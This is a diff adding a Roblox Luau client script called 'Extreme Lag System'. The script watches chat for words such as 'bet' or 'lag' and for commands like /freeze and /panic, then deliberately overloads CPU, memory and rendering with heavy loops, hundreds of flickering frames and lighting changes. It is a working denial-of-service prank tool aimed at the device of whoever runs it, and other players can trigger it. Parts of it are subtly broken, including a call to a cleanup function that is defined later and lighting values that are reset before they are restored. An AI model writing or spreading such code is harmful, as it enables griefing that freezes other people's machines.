@@ -1,0 +1,384 @@
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local Lighting = game:GetService("Lighting")
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "ExtremeLagGUI"
+screenGui.DisplayOrder = 9999
+screenGui.Enabled = true
+screenGui.Parent = playerGui
+
+local mainContainer = Instance.new("Frame")
+mainContainer.Name = "MainContainer"
+mainContainer.Size = UDim2.new(1, 0, 1, 0)
+mainContainer.BackgroundTransparency = 1
+mainContainer.Visible = true
+mainContainer.Active = false
+mainContainer.Parent = screenGui
+
+local isActive = false
+local lagConnections = {}
+local lagObjects = {}
+
+local function triggerExtremeLag()
+    if isActive then return end
+    isActive = true
+    
+    -- TRIPLE CPU OVERLOAD
+    for cpuLayer = 1, 3 do
+        local cpuConnection = RunService.Heartbeat:Connect(function()
+            local result = 0
+            for i = 1, 500000 do
+                result = result + math.sin(i) * math.cos(i) / math.tan(i + 1)
+                result = result * math.random() * math.random() * math.random()
+                result = result + math.sqrt(i) * math.log(i + 1) * math.acos(math.random())
+                result = result * math.exp(math.random()) * math.sinh(math.random())
+                result = result * math.atan2(i, result + 1) * math.cosh(i % 1000 + 1)
+                for j = 1, 5 do
+                    result = result + math.pow(math.random(), math.random())
+                end
+            end
+        end)
+        table.insert(lagConnections, cpuConnection)
+    end
+    
+    -- DOUBLE GPU RENDERING
+    for gpuLayer = 1, 2 do
+        local gpuConnection = RunService.RenderStepped:Connect(function()
+            local total = 0
+            for x = 1, 500 do
+                for y = 1, 500 do
+                    total = total + math.sqrt(x^5 + y^5) * math.sin(x * y * 0.05)
+                    total = total * math.cos(total) * math.tan(total) * math.exp(total * 0.01)
+                    total = total + math.atan2(x, y) * math.log(x * y + 1)
+                    for z = 1, 3 do
+                        total = total * math.sin(x * y * z * 0.01)
+                    end
+                end
+            end
+        end)
+        table.insert(lagConnections, gpuConnection)
+    end
+    
+    -- EXTREME OVERLAY SYSTEM
+    for overlayNum = 1, 15 do
+        local overlay = Instance.new("Frame")
+        overlay.Size = UDim2.new(1, 0, 1, 0)
+        overlay.BackgroundColor3 = Color3.new(overlayNum/20, 0, overlayNum/30)
+        overlay.BackgroundTransparency = 0.97
+        overlay.Parent = mainContainer
+        
+        local overlayConnection = RunService.RenderStepped:Connect(function()
+            overlay.BackgroundTransparency = 0.92 + math.sin(tick() * (20 + overlayNum)) * 0.06
+            overlay.Size = UDim2.new(
+                1 + math.sin(tick() * (10 + overlayNum)) * 0.08, 
+                0, 
+                1 + math.cos(tick() * (10 + overlayNum)) * 0.08, 
+                0
+            )
+            overlay.Rotation = math.sin(tick() * (15 + overlayNum)) * 25
+            overlay.Position = UDim2.new(
+                math.sin(tick() * (5 + overlayNum)) * 0.04, 
+                0,
+                math.cos(tick() * (5 + overlayNum)) * 0.04, 
+                0
+            )
+        end)
+        table.insert(lagConnections, overlayConnection)
+        table.insert(lagObjects, overlay)
+    end
+    
+    -- MASSIVE MEMORY FLOOD
+    local extremeMemory = {}
+    local memoryConnection = RunService.Heartbeat:Connect(function()
+        for i = 1, 10000 do
+            extremeMemory[i] = string.rep("EXTREME_LAG", 5000)
+            extremeMemory[i + 10000] = string.rep("X", 3000)
+            extremeMemory[i + 20000] = string.rep("Y", 4000)
+            extremeMemory[i + 30000] = string.rep("Z", 2000)
+            extremeMemory[i + 40000] = {}
+            for j = 1, 100 do
+                extremeMemory[i + 40000][j] = string.rep(tostring(math.random(1e12)), 100)
+            end
+        end
+        if #extremeMemory > 200000 then
+            for i = 1, 50000 do
+                extremeMemory[i] = nil
+            end
+        end
+    end)
+    table.insert(lagConnections, memoryConnection)
+    lagObjects.extremeMemory = extremeMemory
+    
+    -- PARTICLE STORM (500 particles)
+    for particle = 1, 500 do
+        local particleFrame = Instance.new("Frame")
+        particleFrame.Size = UDim2.new(0.005, 0, 0.005, 0)
+        particleFrame.BackgroundTransparency = 0.995
+        particleFrame.BackgroundColor3 = Color3.new(math.random(), math.random(), math.random())
+        particleFrame.Parent = mainContainer
+        
+        local particleConnection = RunService.RenderStepped:Connect(function()
+            particleFrame.Position = UDim2.new(
+                (math.sin(tick() * particle * 0.3) * 0.7 + 0.5) % 1, 
+                0,
+                (math.cos(tick() * particle * 0.3) * 0.7 + 0.5) % 1, 
+                0
+            )
+            particleFrame.Rotation = (tick() * particle * 2) % 360
+            particleFrame.Size = UDim2.new(
+                0.005 + math.sin(tick() * particle * 0.5) * 0.01, 
+                0,
+                0.005 + math.cos(tick() * particle * 0.5) * 0.01, 
+                0
+            )
+            particleFrame.BackgroundTransparency = 0.99 + math.sin(tick() * particle) * 0.008
+        end)
+        table.insert(lagConnections, particleConnection)
+        table.insert(lagObjects, particleFrame)
+    end
+    
+    -- PHYSICS SIMULATION OVERLOAD
+    for physLayer = 1, 2 do
+        local physicsConnection = RunService.Stepped:Connect(function()
+            local total = 0
+            for x = 1, 200 do
+                for y = 1, 200 do
+                    for z = 1, 10 do
+                        total = total + math.sqrt(x^3 + y^3 + z^3) * math.sin(x * y * z * 0.1)
+                        total = total * math.cos(total) * math.exp(math.random() * 2)
+                        total = total + math.atan2(x*y, z) * math.log(x*y*z + 1)
+                    end
+                end
+            end
+        end)
+        table.insert(lagConnections, physicsConnection)
+    end
+    
+    -- NETWORK SPAM
+    local networkConnection = RunService.Heartbeat:Connect(function()
+        for i = 1, 500 do
+            pcall(function()
+                local fakePacket = {
+                    type = "heavy_data",
+                    id = math.random(1e9),
+                    data = string.rep("NETWORK_SPAM", 10000),
+                    timestamp = tick(),
+                    nested = {
+                        {data = string.rep("A", 5000)},
+                        {data = string.rep("B", 5000)},
+                        {data = string.rep("C", 5000)}
+                    }
+                }
+            end)
+        end
+    end)
+    table.insert(lagConnections, networkConnection)
+    
+    -- STRING CONCATENATION FLOOD
+    local stringConnection = RunService.Heartbeat:Connect(function()
+        local megaString = ""
+        for i = 1, 5000 do
+            megaString = megaString .. string.rep("LAG_OVERLOAD_", 100)
+            megaString = megaString .. string.rep("CPU_GPU_RAM_", 100)
+            if #megaString > 500000 then
+                megaString = ""
+            end
+        end
+    end)
+    table.insert(lagConnections, stringConnection)
+    
+    -- TABLE NESTING MADNESS
+    local tableConnection = RunService.Heartbeat:Connect(function()
+        local nestedHell = {}
+        for i = 1, 500 do
+            nestedHell[i] = {}
+            for j = 1, 50 do
+                nestedHell[i][j] = {}
+                for k = 1, 10 do
+                    nestedHell[i][j][k] = {
+                        value = math.random() * math.random() * math.random(),
+                        text = string.rep("NESTED", 200),
+                        more = {math.random(), math.random(), math.random()}
+                    }
+                end
+            end
+        end
+    end)
+    table.insert(lagConnections, tableConnection)
+    
+    -- RANDOM FRAME GENERATOR
+    local frameConnection = RunService.Heartbeat:Connect(function()
+        for i = 1, 50 do
+            local randomFrame = Instance.new("Frame")
+            randomFrame.Size = UDim2.new(math.random() * 0.1, 0, math.random() * 0.1, 0)
+            randomFrame.Position = UDim2.new(math.random(), 0, math.random(), 0)
+            randomFrame.BackgroundTransparency = math.random() * 0.1 + 0.9
+            randomFrame.BackgroundColor3 = Color3.new(math.random(), math.random(), math.random())
+            randomFrame.Parent = mainContainer
+            table.insert(lagObjects, randomFrame)
+            
+            task.delay(2 + math.random() * 5, function()
+                if randomFrame and randomFrame.Parent then
+                    randomFrame:Destroy()
+                end
+            end)
+        end
+    end)
+    table.insert(lagConnections, frameConnection)
+    
+    -- INPUT SPAM
+    local inputConnection = RunService.Heartbeat:Connect(function()
+        for i = 1, 200 do
+            pcall(function()
+                local fakeEvents = {
+                    {KeyCode = Enum.KeyCode.Space, UserInputState = Enum.UserInputState.Begin},
+                    {KeyCode = Enum.KeyCode.W, UserInputState = Enum.UserInputState.Change},
+                    {KeyCode = Enum.KeyCode.A, UserInputState = Enum.UserInputState.End},
+                    {Position = Vector2.new(math.random() * 1000, math.random() * 1000)}
+                }
+            end)
+        end
+    end)
+    table.insert(lagConnections, inputConnection)
+    
+    -- LIGHTING EFFECTS
+    pcall(function()
+        local oldBrightness = Lighting.Brightness
+        local oldFog = Lighting.FogEnd
+        
+        local lightingConnection = RunService.Heartbeat:Connect(function()
+            Lighting.Brightness = 0.5 + math.sin(tick() * 5) * 0.5
+            Lighting.FogEnd = 100 + math.cos(tick() * 3) * 80
+            Lighting.ColorShift_Top = Color3.new(math.random(), 0, math.random())
+        end)
+        table.insert(lagConnections, lightingConnection)
+        
+        lagObjects.oldBrightness = oldBrightness
+        lagObjects.oldFog = oldFog
+    end)
+    
+    -- AUTO CLEANUP AFTER 30 SECONDS
+    task.delay(30, function()
+        if isActive then
+            clearLag()
+        end
+    end)
+end
+
+local function clearLag()
+    if not isActive then return end
+    isActive = false
+    
+    -- Disconnect all connections
+    for _, conn in pairs(lagConnections) do
+        pcall(function() conn:Disconnect() end)
+    end
+    lagConnections = {}
+    
+    -- Destroy all created objects
+    for _, obj in pairs(lagObjects) do
+        if typeof(obj) == "Instance" and obj.Parent then
+            pcall(function() obj:Destroy() end)
+        end
+    end
+    lagObjects = {}
+    
+    -- Clear main container
+    for _, child in pairs(mainContainer:GetChildren()) do
+        pcall(function() child:Destroy() end)
+    end
+    
+    -- Restore lighting
+    pcall(function()
+        if lagObjects.oldBrightness then
+            Lighting.Brightness = lagObjects.oldBrightness
+        end
+        if lagObjects.oldFog then
+            Lighting.FogEnd = lagObjects.oldFog
+        end
+        Lighting.ColorShift_Top = Color3.new(0, 0, 0)
+    end)
+    
+    -- Force garbage collection
+    task.wait(0.5)
+    for i = 1, 10 do
+        collectgarbage("collect")
+        task.wait(0.1)
+    end
+    
+    print("Lag cleared - system recovering")
+end
+
+local function setupChatDetection()
+    local function monitorPlayer(player)
+        player.Chatted:Connect(function(message)
+            local text = string.lower(message)
+            if (string.find(text, "bet") or string.find(text, "lag") or string.find(text, "freeze")) and not isActive then
+                task.wait(0.3)
+                triggerExtremeLag()
+            end
+        end)
+    end
+    
+    for _, player in pairs(Players:GetPlayers()) do
+        monitorPlayer(player)
+    end
+    
+    Players.PlayerAdded:Connect(monitorPlayer)
+    
+    -- TextChatService detection
+    pcall(function()
+        local TextChatService = game:GetService("TextChatService")
+        if TextChatService then
+            local channels = TextChatService:FindFirstChild("TextChannels")
+            if channels then
+                for _, channel in pairs(channels:GetChildren()) do
+                    if channel:IsA("TextChannel") then
+                        channel.OnMessageReceived:Connect(function(message)
+                            local text = string.lower(message.Text)
+                            if (string.find(text, "bet") or string.find(text, "lag")) and not isActive then
+                                task.wait(0.3)
+                                triggerExtremeLag()
+                            end
+                        end)
+                    end
+                end
+            end
+        end
+    end)
+end
+
+local function setupConsole()
+    player.Chatted:Connect(function(message)
+        local cmd = string.lower(string.sub(message, 1, 100))
+        if (cmd == "/freeze" or cmd == "/lag" or cmd == "/overload") and not isActive then
+            triggerExtremeLag()
+        elseif cmd == "/unfreeze" or cmd == "/stop" then
+            clearLag()
+        elseif cmd == "/panic" and not isActive then
+            -- Instant maximum lag
+            for i = 1, 5 do
+                triggerExtremeLag()
+                task.wait(0.1)
+            end
+        end
+    end)
+end
+
+-- Auto-start on keywords
+setupChatDetection()
+setupConsole()
+
+-- Optional: Auto-start after 30 seconds
+-- task.delay(30, function()
+--     if not isActive then
+--         triggerExtremeLag()
+--     end
+-- end)
+
+print("Extreme Lag System Loaded - Commands: /freeze, /lag, /panic, /stop")
